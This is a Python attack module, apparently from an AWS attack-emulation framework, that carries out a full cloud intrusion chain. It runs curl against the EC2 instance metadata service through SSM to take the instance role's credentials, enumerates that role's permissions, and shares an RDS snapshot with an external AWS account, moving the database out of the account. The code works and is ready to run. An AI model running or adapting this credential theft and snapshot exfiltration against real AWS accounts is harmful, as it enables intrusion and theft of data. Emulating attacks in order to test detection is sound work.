import os
import json
import time
from lib.iam_operations import create_client_profile, create_client_with_sts_credentials
from lib.instance_repo import add_to_disk
from lib.iam_enum import role_recon_sts_token

class Attack:
    def __init__(self, id, region, instance, profile, pathToDisk):
        self.id = id
        self.instance = instance
        self.profile = profile
        self.filename = os.path.abspath(f"{pathToDisk}/{self.id}.json")
        self.region = region
        self.step = 0
        self.status = None
    
    def attack(self):
        self.status = 'attack_started'
        try:
            self.step = 1
            sts_creds = self.get_instance_credentials()
            self.log_important(f"Retrieved Instance Profile STS credentials")
            self._add_to_disk()
            
            self.step = 2
            self.log_important(f"Enumerating EC2 Instance Profile permissions.")
            role_recon_sts_token(sts_creds['AccessKeyId'], sts_creds['SecretAccessKey'], sts_creds['Token'], self.region, self.instance['exchange'])
            self._add_to_disk()

            self.step = 3
            self.share_rds_snapshot(self.instance['resources']['rds_snapshot_id'],'456730832345', sts_creds)
            self.status = 'attack_complete'
            self._add_to_disk()
        except Exception as e:
            self.status = "attack_failed"
            self.log_important(f"Attack failed {e}")
            print(f"Attack failed {e}")
            self._add_to_disk()
            
    def get_instance_credentials(self):
        ssm_client = create_client_profile('ssm', self.region, self.profile)
        commands = '''
        roleName=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
        curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$roleName"
        '''
        response = ssm_client.send_command(
            InstanceIds=[self.instance['resources']['ec2_instance']],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [commands]},
        )
        command_id = response['Command']['CommandId']
        time.sleep(3)   
        
        output = ssm_client.get_command_invocation(
            CommandId=command_id,
            InstanceId=self.instance['resources']['ec2_instance']
        )
        
        if output['Status'] == 'Success':
            credentials_json = output['StandardOutputContent']
            credentials = json.loads(credentials_json)
            return  { 
                'AccessKeyId': credentials.get('AccessKeyId'),
                'SecretAccessKey': credentials.get('SecretAccessKey'),
                'Token': credentials.get('Token') 
            }

    def share_rds_snapshot(self, snapshot_id, external_account_id, temp_credentials):
        rds_client = create_client_with_sts_credentials('rds', self.region, temp_credentials['AccessKeyId'], temp_credentials['SecretAccessKey'], temp_credentials['Token'])
        
        if self.wait_for_snapshot_availability(rds_client, snapshot_id) == False:
            raise Exception("Timed out waiting for snapshot to become available.")
        
        response = rds_client.modify_db_snapshot_attribute(
            DBSnapshotIdentifier=snapshot_id,
            AttributeName='restore',
            ValuesToAdd=[external_account_id,]
        )
        self.log_api_call('modify_db_snapshot_attribute', response)
        self.log_important(f"Shared RDS snapshot {snapshot_id} with external account {external_account_id}.")

    def wait_for_snapshot_availability(self, rds_client, snapshot_identifier, timeout=600):
        waited = 0
        while waited < timeout:
            snapshot = rds_client.describe_db_snapshots(DBSnapshotIdentifier=snapshot_identifier)['DBSnapshots'][0]
            if snapshot['Status'] == 'available':
                print("Snapshot is available.")
                return True
            else:
                print("Waiting for snapshot to become available...")
                time.sleep(30)  # Wait for 30 seconds
                waited += 30
        print("Timed out waiting for snapshot to become available.")
        return False
    
    def log_api_call(self, operation, response):
        self.instance['exchange'].append({'operation': operation, 'response': response})

    def log_important(self, message):
        self.instance['logs'].append(message)

    def _add_to_disk(self):
        add_to_disk(self.filename, self.id, self.status, self.step, self.instance["exchange"],self.instance["logs"],self.instance["resources"])